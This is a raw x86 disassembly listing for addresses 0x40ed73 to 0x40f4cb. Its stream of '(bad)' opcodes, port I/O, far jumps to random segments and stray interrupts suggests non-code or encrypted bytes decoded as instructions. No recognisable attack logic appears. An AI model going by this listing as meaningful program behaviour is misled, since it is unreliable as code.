  40ed73:	cdq    
  40ed74:	pop    ds
  40ed75:	ret    
  40ed76:	cmp    BYTE PTR [ecx],dh
  40ed78:	loopne 0x40edf8
  40ed7a:	jmp    0xd8a29ccc
  40ed7f:	in     eax,dx
  40ed80:	or     al,dh
  40ed82:	mov    ebp,0xe984f4c2
  40ed87:	mov    esp,0x92369608
  40ed8c:	std    
  40ed8d:	mov    ebp,0xbb190a0c
  40ed92:	jb     0x40edd8
  40ed94:	jmp    FWORD PTR [ebp+0x1ad52e01]
  40ed9a:	cmc    
  40ed9b:	imul   edi,DWORD PTR [esi+ebx*8],0xcc6c5113
  40eda2:	stc    
  40eda3:	(bad)  
  40eda5:	cmp    ch,dh
  40eda7:	outs   dx,BYTE PTR ds:[esi]
  40eda8:	inc    esi
  40eda9:	retf   
  40edaa:	jae    0x40edfa
  40edac:	cmp    ebp,DWORD PTR [ebp-0x76]
  40edaf:	pushf  
  40edb0:	jae    0x40eddb
  40edb2:	into   
  40edb3:	aas    
  40edb4:	js     0x40ed6a
  40edb6:	mov    esp,0x659a8255
  40edbb:	mov    ch,0xd7
  40edbd:	pop    edi
  40edbe:	test   DWORD PTR [edi],0xc5be5fef
  40edc4:	shl    DWORD PTR [eax+0x5480cbcb],0xd8
  40edcb:	xor    BYTE PTR [ecx+0x3d08e948],bl
  40edd1:	pop    eax
  40edd2:	add    BYTE PTR [esi+0x3544e8ad],dh
  40edd8:	add    eax,0x6069c9da
  40eddd:	shl    DWORD PTR [esp+esi*8-0x5e26ef9f],0x1f
  40ede5:	xchg   DWORD PTR [edi+0x4a],ecx
  40ede8:	repnz inc edi
  40edea:	into   
  40edeb:	mov    ch,0x1c
  40eded:	loop   0x40edf5
  40edef:	push   ds
  40edf0:	xor    eax,DWORD PTR [edi+0x30]
  40edf3:	mov    eax,0x5bfd61c3
  40edf8:	pushf  
  40edf9:	ja     0x40edc3
  40edfb:	cmc    
  40edfc:	(bad)  
  40edfe:	push   0x48c7584d
  40ee03:	iret   
  40ee04:	or     al,0xd1
  40ee06:	sbb    BYTE PTR [esp+ebx*1+0x3758c2fa],0x1d
  40ee0e:	jp     0x40ee23
  40ee10:	ja     0x40ee41
  40ee12:	loop   0x40ee29
  40ee14:	das    
  40ee15:	pop    ebp
  40ee16:	int    0x3b
  40ee18:	sbb    esp,DWORD PTR [esi-0xaabd9a1]
  40ee1e:	repnz xor esi,esi
  40ee21:	xor    BYTE PTR [eiz*8+0x1d94be12],bl
  40ee28:	call   0xe6633d5e
  40ee2d:	jne    0x40ee8b
  40ee2f:	dec    esi
  40ee30:	ins    DWORD PTR es:[edi],dx
  40ee31:	adc    BYTE PTR [ebp-0x75],cl
  40ee34:	inc    ebp
  40ee35:	adc    DWORD PTR [esi],ebp
  40ee37:	repz fwait
  40ee39:	ret    
  40ee3a:	clc    
  40ee3b:	lea    ebp,[eax]
  40ee3d:	fld    TBYTE PTR [ebx+0x52]
  40ee40:	dec    edi
  40ee41:	xor    DWORD PTR [eax+0xe],0x58746d4d
  40ee48:	inc    esi
  40ee49:	sahf   
  40ee4a:	aad    0x8f
  40ee4c:	cmp    al,0x30
  40ee4e:	ror    BYTE PTR [eax-0x44c41697],0xaf
  40ee55:	mov    bl,0xeb
  40ee57:	mov    ecx,0xeb04f216
  40ee5c:	fs xor eax,0x780bcefc
  40ee62:	jns    0x40ee8e
  40ee64:	mov    edx,0x3cccaf1e
  40ee69:	rcr    dh,1
  40ee6b:	adc    eax,0xe2b7cc17
  40ee70:	int    0xba
  40ee72:	stos   BYTE PTR es:[edi],al
  40ee73:	mov    ebp,DWORD PTR [ebx-0x36]
  40ee76:	pop    edi
  40ee77:	or     bh,BYTE PTR [esi]
  40ee79:	or     BYTE PTR [edx],ch
  40ee7b:	and    eax,0x2b84ba97
  40ee80:	xchg   ecx,eax
  40ee81:	sub    DWORD PTR [ebx+0x76abb20d],0xffffffec
  40ee88:	sbb    DWORD PTR [edx-0x52],esi
  40ee8b:	sbb    BYTE PTR [edi+eax*2],al
  40ee8e:	out    0x36,eax
  40ee90:	popf   
  40ee91:	aaa    
  40ee92:	pop    es
  40ee93:	jb     0x40eed1
  40ee95:	test   al,0x97
  40ee97:	jge    0x40ee5a
  40ee99:	sbb    DWORD PTR [edx-0x6fa23c25],esi
  40ee9f:	es push 0xb0367623
  40eea5:	outs   dx,BYTE PTR ds:[esi]
  40eea6:	adc    al,al
  40eea8:	ror    BYTE PTR [edx-0x73bf1b65],cl
  40eeae:	sub    BYTE PTR [ebp+ebx*4+0x23],cl
  40eeb2:	inc    eax
  40eeb3:	rep ins DWORD PTR es:[edi],dx
  40eeb5:	outs   dx,DWORD PTR ds:[esi]
  40eeb6:	push   ss
  40eeb7:	out    0xf1,eax
  40eeb9:	retf   
  40eeba:	call   0xb15cbd7b
  40eebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eec0:	test   BYTE PTR [ebx+0x30f0f34c],al
  40eec6:	sub    ah,ah
  40eec8:	pop    esp
  40eec9:	mov    bh,0x2
  40eecb:	inc    esi
  40eecc:	sbb    eax,0x3d36d073
  40eed1:	xchg   esi,eax
  40eed2:	adc    BYTE PTR [ebp+eax*8+0x79c7aec9],cl
  40eed9:	hlt    
  40eeda:	test   al,0x4c
  40eedc:	pop    ds
  40eedd:	jle    0x40eee9
  40eedf:	xchg   ebx,eax
  40eee0:	sti    
  40eee1:	nop
  40eee2:	push   ebp
  40eee3:	cmp    bh,BYTE PTR [eax]
  40eee5:	mov    ecx,0x824ed493
  40eeea:	xor    BYTE PTR [edi+0x41095afa],bh
  40eef0:	mov    BYTE PTR [ebx+0x296a005d],ch
  40eef6:	cmp    BYTE PTR ds:0xcf6cc70b,dh
  40eefc:	lods   al,BYTE PTR ds:[esi]
  40eefd:	int3   
  40eefe:	ret    0x701a
  40ef01:	pop    ebp
  40ef02:	xor    cl,BYTE PTR [ebp+0x60]
  40ef05:	mov    esi,0xc4d0a40
  40ef0a:	jp     0x40ef14
  40ef0c:	test   BYTE PTR [eax+0x565eafaf],ch
  40ef12:	inc    edx
  40ef13:	xor    BYTE PTR [ecx],al
  40ef15:	data16 aaa 
  40ef17:	jbe    0x40ef86
  40ef19:	out    0xce,eax
  40ef1b:	ficomp DWORD PTR [ebp+0x133c10a5]
  40ef21:	mul    DWORD PTR [eax-0x3f1655dd]
  40ef27:	jmp    0x1e9645ae
  40ef2c:	(bad)  
  40ef2d:	ins    DWORD PTR es:[edi],dx
  40ef2e:	pop    ebx
  40ef2f:	and    dh,BYTE PTR [ebx+0x491b55c1]
  40ef35:	or     ah,0x3a
  40ef38:	adc    BYTE PTR [esp+esi*8-0x3d4e1462],bh
  40ef3f:	popf   
  40ef40:	ficom  WORD PTR [eax-0x18]
  40ef43:	jns    0x40efaf
  40ef45:	inc    ebx
  40ef46:	mov    al,0x14
  40ef48:	not    bl
  40ef4a:	push   ss
  40ef4b:	xchg   esi,eax
  40ef4c:	cmp    ebp,eax
  40ef4e:	das    
  40ef4f:	cmp    esp,DWORD PTR [ebx]
  40ef51:	cmp    DWORD PTR [esp+ecx*8-0x33],ecx
  40ef55:	ss (bad) 
  40ef57:	pop    eax
  40ef58:	jmp    0x4d40:0x74cc8c35
  40ef5f:	adc    eax,0x7a60e82e
  40ef64:	cli    
  40ef65:	xor    DWORD PTR [ecx+ebp*4],ebx
  40ef68:	int    0xf3
  40ef6a:	hlt    
  40ef6b:	jl     0x40efe9
  40ef6d:	and    DWORD PTR [ecx+0x26],0x5c30e58b
  40ef74:	cmp    ebx,ecx
  40ef76:	repz cmp eax,0xb29f7c53
  40ef7c:	mov    ch,0x81
  40ef7e:	jno    0x40effa
  40ef80:	cmovge esi,DWORD PTR [esi]
  40ef83:	retf   0x2845
  40ef86:	(bad)  [ecx+0x4a]
  40ef89:	pop    edi
  40ef8a:	test   BYTE PTR [edi+ebp*1-0x45a1b406],dl
  40ef91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef92:	pop    eax
  40ef93:	pop    ecx
  40ef94:	outs   dx,BYTE PTR ds:[esi]
  40ef95:	repz ja 0x40eff1
  40ef98:	shr    BYTE PTR [edi+ebx*2],1
  40ef9b:	into   
  40ef9c:	scas   al,BYTE PTR es:[edi]
  40ef9d:	cmp    esp,esp
  40ef9f:	jae    0x40ef47
  40efa1:	push   eax
  40efa2:	xchg   esi,eax
  40efa3:	sbb    eax,0xbf2716ce
  40efa8:	mov    eax,0x6c3527b1
  40efad:	and    BYTE PTR [ecx-0x45],dl
  40efb0:	fstp   TBYTE PTR [edi]
  40efb2:	dec    eax
  40efb3:	jg     0x40f033
  40efb5:	imul   ebx,DWORD PTR [edx],0x5d
  40efb8:	pop    esi
  40efb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efba:	jecxz  0x40ef66
  40efbc:	arpl   WORD PTR [eax],sp
  40efbe:	ins    DWORD PTR es:[edi],dx
  40efbf:	or     eax,0xa81ba038
  40efc4:	push   edi
  40efc5:	(bad)  
  40efc6:	cmp    al,0x2d
  40efc8:	sub    eax,0xa525d7b5
  40efcd:	and    eax,0x458bc6a6
  40efd2:	xor    DWORD PTR [ebp+0x359dccf1],edx
  40efd8:	push   cs
  40efd9:	fldenv [ecx+0x7ccfde28]
  40efdf:	xchg   ebx,eax
  40efe0:	call   0x43a2d3bd
  40efe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe6:	xchg   BYTE PTR [edx+0x2cad3b16],ch
  40efec:	pop    eax
  40efed:	and    DWORD PTR [ebx+0x69845ea],edi
  40eff3:	jmp    0x608a:0xda74d610
  40effa:	xor    esi,edi
  40effc:	lods   al,BYTE PTR ds:[esi]
  40effd:	loopne 0x40efbf
  40efff:	aad    0xfd
  40f001:	jne    0x40f051
  40f003:	mov    dh,0x67
  40f005:	xchg   ecx,eax
  40f006:	test   dl,ch
  40f008:	daa    
  40f009:	xchg   edi,eax
  40f00a:	sbb    esi,esi
  40f00c:	jbe    0x40efef
  40f00e:	and    edx,0xcf31636e
  40f014:	in     eax,dx
  40f015:	xor    BYTE PTR [eax-0x23],cl
  40f018:	ja     0x40f021
  40f01a:	into   
  40f01b:	push   edi
  40f01c:	in     al,0x2b
  40f01e:	push   ss
  40f01f:	(bad)  
  40f020:	stc    
  40f021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f022:	xchg   ebx,eax
  40f023:	and    cl,cl
  40f025:	stos   DWORD PTR es:[edi],eax
  40f026:	dec    edx
  40f027:	test   BYTE PTR [eax-0x6f],0x82
  40f02b:	dec    edx
  40f02c:	mov    BYTE PTR [eax+esi*2-0x6c9374b9],dh
  40f033:	das    
  40f034:	xor    esi,DWORD PTR [ebx-0x1790e3f4]
  40f03a:	mov    DWORD PTR [ebp-0x7f4519de],eax
  40f040:	sbb    cl,0xa5
  40f043:	in     eax,0x13
  40f045:	pop    edx
  40f046:	mov    ebp,0xf24bdc36
  40f04b:	ins    BYTE PTR es:[edi],dx
  40f04c:	or     edi,DWORD PTR [ebx]
  40f04e:	cmp    DWORD PTR [ecx+0x7f9cf715],ecx
  40f054:	in     eax,0x82
  40f056:	hlt    
  40f057:	push   ebp
  40f058:	sbb    ecx,ecx
  40f05a:	pop    edi
  40f05b:	pop    eax
  40f05c:	lea    edx,[ebp+0x68791215]
  40f062:	jle    0x40f09c
  40f064:	jne    0x40f0e1
  40f066:	ins    BYTE PTR es:[edi],dx
  40f067:	daa    
  40f068:	jl     0x40f083
  40f06a:	sub    ch,BYTE PTR [edi+0x53a20920]
  40f070:	xchg   ecx,eax
  40f071:	(bad)  
  40f072:	mov    ecx,DWORD PTR ds:0x4ce6fadd
  40f078:	and    eax,0xd2c6f308
  40f07d:	jno    0x40f053
  40f07f:	add    al,0x93
  40f081:	mov    ds:0x64422506,eax
  40f086:	hlt    
  40f087:	jl     0x40f009
  40f089:	push   edi
  40f08a:	or     edi,DWORD PTR [ebx-0x69792249]
  40f090:	add    eax,0x3c44dc47
  40f095:	jbe    0x40f07b
  40f097:	mov    al,ds:0x55b8643d
  40f09c:	jmp    0xc6e11e4f
  40f0a1:	test   eax,0xd404203c
  40f0a6:	pop    esp
  40f0a7:	fldenv [edi+edi*8]
  40f0aa:	retf   
  40f0ab:	xchg   esp,eax
  40f0ac:	cs cwde 
  40f0ae:	ficomp DWORD PTR [eax+0x73]
  40f0b1:	jae    0x40f11d
  40f0b3:	call   0xdb00:0xc1dd1ed7
  40f0ba:	icebp  
  40f0bb:	sub    eax,0x5a023d94
  40f0c0:	jne    0x40f133
  40f0c2:	cwde   
  40f0c3:	xchg   ebx,eax
  40f0c4:	xor    esi,ecx
  40f0c6:	nop
  40f0c7:	sub    al,0xd7
  40f0c9:	inc    eax
  40f0ca:	pushf  
  40f0cb:	pop    eax
  40f0cc:	and    esi,DWORD PTR [ebx]
  40f0ce:	sub    ebp,DWORD PTR [esi+0x35ffa981]
  40f0d4:	(bad)  
  40f0d5:	neg    edi
  40f0d7:	mov    ch,0x35
  40f0d9:	nop
  40f0da:	xor    al,0x57
  40f0dc:	pop    es
  40f0dd:	add    BYTE PTR [eax],ah
  40f0df:	nop
  40f0e0:	popf   
  40f0e1:	cs ins BYTE PTR es:[edi],dx
  40f0e3:	sahf   
  40f0e4:	lds    edi,FWORD PTR fs:[ebp-0x379a7530]
  40f0eb:	dec    eax
  40f0ec:	add    BYTE PTR [eax-0x40],cl
  40f0ef:	fmul   st(5),st
  40f0f1:	call   0x90d:0x7f6287e1
  40f0f8:	in     al,dx
  40f0f9:	sbb    DWORD PTR [edi],0xffffffb5
  40f0fc:	and    dl,dh
  40f0fe:	push   edi
  40f0ff:	ds mov ah,0x13
  40f102:	rol    DWORD PTR [ebx],1
  40f104:	sbb    al,0x4e
  40f106:	aaa    
  40f107:	stc    
  40f108:	dec    edi
  40f109:	loop   0x40f12b
  40f10b:	add    BYTE PTR [esi+0xe],cl
  40f10e:	and    DWORD PTR [eax-0x2b8e8384],ebp
  40f114:	fwait
  40f115:	rcr    BYTE PTR [edi],cl
  40f117:	mov    ?,WORD PTR [eax+0x45]
  40f11a:	repz mov ah,0xf
  40f11d:	cmp    ebp,DWORD PTR [ebx]
  40f11f:	(bad)  
  40f120:	sti    
  40f121:	pop    ebx
  40f122:	in     al,0xb3
  40f124:	jecxz  0x40f0f1
  40f126:	mov    BYTE PTR [esi-0x7],bh
  40f129:	icebp  
  40f12a:	cdq    
  40f12b:	pop    edi
  40f12c:	(bad)  
  40f12d:	loopne 0x40f119
  40f12f:	aaa    
  40f130:	add    ah,ch
  40f132:	mov    bl,0xad
  40f134:	inc    ecx
  40f135:	dec    edx
  40f136:	vhaddpd ymm1,ymm2,YMMWORD PTR [esi-0x73854d56]
  40f13e:	cmp    al,0xc4
  40f140:	je     0x40f126
  40f142:	inc    esi
  40f143:	shl    BYTE PTR [ebp-0x5535a616],cl
  40f149:	mov    eax,ds:0x7d80f10e
  40f14e:	add    BYTE PTR [esi+ebp*2+0x21],cl
  40f152:	jno    0x40f1a2
  40f154:	mov    gs,edx
  40f156:	xor    BYTE PTR [ebp-0x7d80a01f],0x42
  40f15d:	dec    edx
  40f15e:	and    cl,al
  40f160:	repnz std 
  40f162:	aaa    
  40f163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f164:	int3   
  40f165:	stos   DWORD PTR es:[edi],eax
  40f166:	jg     0x40f1a1
  40f168:	xor    cl,BYTE PTR ds:0x7e131053
  40f16e:	mov    ds:0x198e7286,eax
  40f173:	dec    ebp
  40f174:	(bad)  
  40f175:	xor    DWORD PTR [ebx],eax
  40f177:	xchg   edx,eax
  40f178:	push   ecx
  40f179:	mov    ecx,0xd0dfad1a
  40f17e:	mov    dh,0x4d
  40f180:	add    BYTE PTR [edx-0x7ae55b44],al
  40f186:	addr16 or al,0xb
  40f189:	sub    cl,dh
  40f18b:	test   ah,dl
  40f18d:	xor    DWORD PTR [ebp-0x22c65155],ecx
  40f193:	cdq    
  40f194:	(bad)  
  40f195:	and    DWORD PTR [ecx+0x12710a00],esp
  40f19b:	xchg   ebp,eax
  40f19c:	inc    ecx
  40f19d:	pusha  
  40f19e:	cwde   
  40f19f:	stos   BYTE PTR es:[edi],al
  40f1a0:	in     al,dx
  40f1a1:	pop    ebx
  40f1a2:	inc    edi
  40f1a3:	ins    BYTE PTR es:[di],dx
  40f1a5:	xchg   BYTE PTR [ecx-0x1c],ah
  40f1a8:	aad    0xa0
  40f1aa:	stos   DWORD PTR es:[edi],eax
  40f1ab:	sub    eax,0xdc762262
  40f1b0:	sub    dh,BYTE PTR [ebx-0x1b1dc52d]
  40f1b6:	nop
  40f1b7:	shl    BYTE PTR [ecx-0x31],1
  40f1ba:	xchg   esp,eax
  40f1bb:	loopne 0x40f1b1
  40f1bd:	push   cs
  40f1be:	loopne 0x40f1d9
  40f1c0:	jae    0x40f1d1
  40f1c2:	pop    ebp
  40f1c3:	xor    esi,esi
  40f1c5:	scas   al,BYTE PTR es:[edi]
  40f1c6:	push   ebx
  40f1c7:	int    0x38
  40f1c9:	jns    0x40f242
  40f1cb:	adc    BYTE PTR [ecx+0x6d],0x63
  40f1cf:	jo     0x40f196
  40f1d1:	pop    ds
  40f1d2:	(bad)  [edi]
  40f1d4:	in     al,dx
  40f1d5:	arpl   WORD PTR [edx],bp
  40f1d7:	pop    ebp
  40f1d8:	jno    0x40f1d9
  40f1da:	mov    DWORD PTR [edi+0x4d],edx
  40f1dd:	adc    bl,BYTE PTR [edi]
  40f1df:	stc    
  40f1e0:	push   eax
  40f1e1:	pushf  
  40f1e2:	and    eax,0x6fc821d1
  40f1e7:	or     cl,BYTE PTR [ecx+0x7264a757]
  40f1ed:	hlt    
  40f1ee:	les    esi,FWORD PTR [ebp-0x2b]
  40f1f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1f2:	and    DWORD PTR [eax-0x6953f771],edi
  40f1f8:	fcomi  st,st(1)
  40f1fa:	sar    bh,0xf7
  40f1fd:	sahf   
  40f1fe:	add    esi,esp
  40f200:	ret    0xb387
  40f203:	in     eax,0x3f
  40f205:	push   ecx
  40f206:	mov    ebx,0x3d092df2
  40f20b:	jge    0x40f28a
  40f20d:	pop    esp
  40f20e:	and    bl,dl
  40f210:	das    
  40f211:	push   cs
  40f212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f213:	pop    ds
  40f214:	jo     0x40f200
  40f216:	dec    ebp
  40f217:	mov    bl,0x38
  40f219:	imul   esi,DWORD PTR [ecx+0x2d04ce19],0x1f
  40f220:	push   ecx
  40f221:	sar    DWORD PTR [eax],cl
  40f223:	xor    ch,BYTE PTR [ebx+0x2d5b7e81]
  40f229:	inc    eax
  40f22a:	fwait
  40f22b:	mov    ecx,0x701767da
  40f230:	lods   ax,WORD PTR ds:[esi]
  40f232:	repz push edx
  40f234:	retf   0x1c4a
  40f237:	ret    0xf5c7
  40f23a:	imul   esi,DWORD PTR [ebx-0x16416427],0x1a
  40f241:	inc    edi
  40f242:	xchg   esp,eax
  40f243:	sub    DWORD PTR [ebp+0x5d],ebp
  40f246:	sub    edi,DWORD PTR [edi+0x25]
  40f249:	sahf   
  40f24a:	jne    0x40f21f
  40f24c:	mov    al,ds:0x5c3ec47c
  40f251:	push   edi
  40f252:	jne    0x40f1e7
  40f254:	push   0xb5ead83d
  40f259:	int3   
  40f25a:	inc    esp
  40f25b:	jmp    0x5a75:0x60cfc479
  40f262:	popf   
  40f263:	inc    ebx
  40f264:	cdq    
  40f265:	stos   BYTE PTR es:[edi],al
  40f266:	sub    edi,0x11b61d81
  40f26c:	pop    eax
  40f26d:	es or  eax,0xf601d133
  40f273:	jle    0x40f2ba
  40f275:	xchg   ebx,eax
  40f276:	ins    BYTE PTR es:[edi],dx
  40f277:	popf   
  40f278:	ret    
  40f279:	ret    
  40f27a:	bound  edi,QWORD PTR [eax-0x757be27a]
  40f280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f281:	sbb    bh,BYTE PTR [ebp-0x60]
  40f284:	fs out dx,al
  40f286:	push   0xb749e874
  40f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28c:	push   esp
  40f28d:	push   esi
  40f28e:	in     al,dx
  40f28f:	cmp    ah,ch
  40f291:	push   edi
  40f292:	iret   
  40f293:	add    eax,DWORD PTR [edx-0x3ceb5707]
  40f299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f29a:	leave  
  40f29b:	sbb    BYTE PTR [ecx],bh
  40f29d:	fstp   QWORD PTR ds:0x2a223c01
  40f2a3:	icebp  
  40f2a4:	outs   dx,DWORD PTR ds:[esi]
  40f2a5:	test   BYTE PTR [ecx],bl
  40f2a7:	stos   BYTE PTR es:[edi],al
  40f2a8:	ja     0x40f278
  40f2aa:	jp     0x40f31e
  40f2ac:	clc    
  40f2ad:	xor    BYTE PTR [ebx],0x20
  40f2b0:	lods   eax,DWORD PTR ds:[esi]
  40f2b1:	test   BYTE PTR [esi+eiz*1],0x58
  40f2b5:	sti    
  40f2b6:	pop    eax
  40f2b7:	test   al,0xd1
  40f2b9:	jmp    0x40ad9e7
  40f2be:	add    BYTE PTR ds:0x43872a84,bh
  40f2c4:	adc    dh,bh
  40f2c6:	cmp    al,0x57
  40f2c8:	xchg   esp,eax
  40f2c9:	push   ss
  40f2ca:	add    DWORD PTR [esp+edi*8-0x67d7182c],ecx
  40f2d1:	sbb    DWORD PTR [esi-0x286d177e],ebx
  40f2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d8:	ins    BYTE PTR es:[edi],dx
  40f2d9:	and    ch,ah
  40f2db:	dec    ecx
  40f2dc:	int    0x0
  40f2de:	cmp    al,0x87
  40f2e0:	gs xchg edx,eax
  40f2e2:	je     0x40f2ac
  40f2e4:	push   ds
  40f2e5:	retf   
  40f2e6:	mov    ds,WORD PTR [eax]
  40f2e8:	gs xchg ecx,eax
  40f2ea:	dec    edi
  40f2eb:	neg    DWORD PTR [edi]
  40f2ed:	enter  0x10ed,0x83
  40f2f1:	ret    
  40f2f2:	aas    
  40f2f3:	fild   WORD PTR [esi-0x42d42fe3]
  40f2f9:	pop    ebp
  40f2fa:	mov    ebp,0x95d308fa
  40f2ff:	push   ds
  40f300:	nop
  40f301:	idiv   BYTE PTR [edi+0x34]
  40f304:	arpl   WORD PTR [edx+0x1f336f61],bp
  40f30a:	xchg   ecx,eax
  40f30b:	test   DWORD PTR es:[edx+0x22],esp
  40f30f:	nop
  40f310:	call   0xda9f:0xbbf76788
  40f317:	fild   QWORD PTR [esi+eax*1+0x5b]
  40f31b:	sar    edx,1
  40f31d:	out    dx,al
  40f31e:	or     ecx,edx
  40f320:	call   0xc954:0x7d268460
  40f327:	push   ecx
  40f328:	adc    DWORD PTR [edi+eiz*8-0x67726ba0],ecx
  40f32f:	xchg   DWORD PTR [eax+0x43293e6b],ebp
  40f335:	cli    
  40f336:	lahf   
  40f337:	jle    0x40f3a9
  40f339:	jmp    0x40f2fb
  40f33b:	outs   dx,BYTE PTR ds:[esi]
  40f33c:	and    BYTE PTR ds:0xc3ea937,dl
  40f342:	icebp  
  40f343:	push   ds
  40f344:	call   0x103e4b94
  40f349:	mov    edi,0x132fe7d6
  40f34e:	ud0    esp,DWORD PTR [esi]
  40f351:	cs mov bl,0x3b
  40f354:	cld    
  40f355:	in     eax,dx
  40f356:	mov    bl,0x10
  40f358:	pop    eax
  40f359:	test   DWORD PTR [ebx],edi
  40f35b:	pushf  
  40f35c:	push   ss
  40f35d:	(bad)  
  40f35e:	out    0xd5,eax
  40f360:	sti    
  40f361:	sti    
  40f362:	add    BYTE PTR [eax+0x57],cl
  40f365:	pop    ecx
  40f366:	mov    DWORD PTR [edi+0x9366343],eax
  40f36c:	stos   BYTE PTR es:[edi],al
  40f36d:	sub    al,0x54
  40f36f:	add    BYTE PTR [ecx+0x3c],cl
  40f372:	rol    BYTE PTR [edi-0x11644f68],cl
  40f378:	test   BYTE PTR [ebp+0x66],dh
  40f37b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f37c:	retf   
  40f37d:	out    0xd0,eax
  40f37f:	mov    cl,0xd3
  40f381:	fcom   QWORD PTR [esi]
  40f383:	rol    DWORD PTR [eax+edx*2],1
  40f386:	cmc    
  40f387:	aam    0x73
  40f389:	aaa    
  40f38a:	xor    eax,0x3f1842c4
  40f38f:	and    ecx,DWORD PTR [edx+0x2b]
  40f392:	repnz es add eax,edx
  40f396:	adc    eax,0x5662e786
  40f39b:	push   cs
  40f39c:	xchg   edi,eax
  40f39d:	sub    al,0x3
  40f39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3a0:	(bad)  
  40f3a1:	stc    
  40f3a2:	lds    ecx,FWORD PTR cs:[edi]
  40f3a5:	(bad)  
  40f3a6:	mov    edi,0x6ca65b1
  40f3ab:	dec    ecx
  40f3ac:	arpl   bx,si
  40f3ae:	outs   dx,BYTE PTR ds:[esi]
  40f3af:	xchg   ecx,eax
  40f3b0:	into   
  40f3b1:	retf   
  40f3b2:	ins    BYTE PTR es:[edi],dx
  40f3b3:	and    ch,dl
  40f3b5:	sub    DWORD PTR [ebx-0x71230bbd],eax
  40f3bb:	imul   ebp,DWORD PTR [ecx+0x9c95e2e],0x89a70c1
  40f3c5:	ror    BYTE PTR [edi],0x92
  40f3c8:	lods   eax,DWORD PTR ds:[esi]
  40f3c9:	jno    0x40f3ce
  40f3cb:	xchg   edi,eax
  40f3cc:	call   0x242766fe
  40f3d1:	test   eax,0x87988e93
  40f3d6:	outs   dx,BYTE PTR ds:[esi]
  40f3d7:	js     0x40f41d
  40f3d9:	push   0x6
  40f3db:	int    0xa4
  40f3dd:	repnz and DWORD PTR fs:[esi],ecx
  40f3e1:	xor    dl,BYTE PTR [ebx]
  40f3e3:	and    esi,DWORD PTR [edx+0x5f1473c4]
  40f3e9:	jo     0x40f3a0
  40f3eb:	pop    es
  40f3ec:	sub    bl,BYTE PTR [edi]
  40f3ee:	push   ss
  40f3ef:	dec    edx
  40f3f0:	mov    esp,0xce1979fc
  40f3f5:	leave  
  40f3f6:	mov    WORD PTR [ecx],ds
  40f3f8:	push   edx
  40f3f9:	mov    dh,0x8b
  40f3fb:	dec    ebp
  40f3fc:	retf   0xe6b0
  40f3ff:	les    ebp,FWORD PTR [ecx-0x2d]
  40f402:	idiv   cl
  40f404:	mov    bl,0x8d
  40f406:	cmp    al,0x6
  40f408:	inc    edx
  40f409:	cmc    
  40f40a:	cli    
  40f40b:	lods   al,BYTE PTR ds:[esi]
  40f40c:	push   edx
  40f40d:	dec    edi
  40f40e:	jo     0x40f3f3
  40f410:	call   0x616e:0x2ec4b42a
  40f417:	imul   ebx,DWORD PTR [edi-0x73],0x640482a0
  40f41e:	cmp    DWORD PTR [ecx-0x38],esp
  40f421:	int    0x73
  40f423:	inc    ebp
  40f424:	das    
  40f425:	mov    edx,0x1815e44b
  40f42a:	xlat   BYTE PTR ds:[ebx]
  40f42b:	and    dh,dl
  40f42d:	push   ebp
  40f42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f42f:	fwait
  40f430:	fwait
  40f431:	pusha  
  40f432:	sbb    eax,DWORD PTR [esi+0x41fdcc6b]
  40f438:	or     dh,BYTE PTR [ebx+edx*1]
  40f43b:	mov    ebp,DWORD PTR [ebp-0x6c4d7c3d]
  40f441:	xchg   esi,eax
  40f442:	call   DWORD PTR [esi]
  40f444:	loope  0x40f4b8
  40f446:	daa    
  40f447:	imul   edi,DWORD PTR [ebx-0x65],0x857c55ba
  40f44e:	cmp    al,0xb7
  40f450:	es cmc 
  40f452:	push   ecx
  40f453:	mov    cl,0x43
  40f455:	push   0xfffffff6
  40f457:	push   ss
  40f458:	call   0xba8d3e34
  40f45d:	add    al,0xb2
  40f45f:	dec    ebp
  40f460:	inc    esi
  40f461:	cld    
  40f462:	sbb    DWORD PTR [edx+eiz*1-0x74],esi
  40f466:	enter  0xd0c4,0xa0
  40f46a:	int    0x56
  40f46c:	sbb    ch,BYTE PTR [edi+0x22]
  40f46f:	sub    al,0xe2
  40f471:	mov    ds:0x1131afd6,eax
  40f476:	jb     0x40f446
  40f478:	add    DWORD PTR [edi],0xffffffd7
  40f47b:	xor    eax,0xd9fc9839
  40f480:	ins    BYTE PTR es:[edi],dx
  40f481:	xlat   BYTE PTR ds:[ebx]
  40f482:	cld    
  40f483:	lahf   
  40f484:	and    DWORD PTR [eax-0x208baa20],ebx
  40f48a:	out    0x65,eax
  40f48c:	out    0x39,eax
  40f48e:	dec    ebx
  40f48f:	and    ch,BYTE PTR [eax]
  40f491:	xchg   edx,eax
  40f492:	dec    esp
  40f493:	or     eax,edx
  40f495:	mov    ah,0x1
  40f497:	jecxz  0x40f428
  40f499:	retf   
  40f49a:	and    al,0xba
  40f49c:	ins    BYTE PTR es:[edi],dx
  40f49d:	in     eax,0xb8
  40f49f:	sub    al,0xb9
  40f4a1:	push   ebp
  40f4a2:	jne    0x40f488
  40f4a4:	cmp    cl,dh
  40f4a6:	shl    BYTE PTR ds:0x40c49b81,0xc9
  40f4ad:	imul   eax,DWORD PTR [edx],0x7a
  40f4b0:	xchg   ebp,eax
  40f4b1:	lock aas 
  40f4b3:	aas    
  40f4b4:	pop    eax
  40f4b5:	icebp  
  40f4b6:	inc    ebx
  40f4b7:	je     0x40f4ab
  40f4b9:	pop    ecx
  40f4ba:	aaa    
  40f4bb:	jmp    0xedf2:0x788f19ab
  40f4c2:	jmp    0x40f4ad
  40f4c4:	mov    al,0x84
  40f4c6:	std    
  40f4c7:	enter  0x2760,0x35
  40f4cb:	pusha  
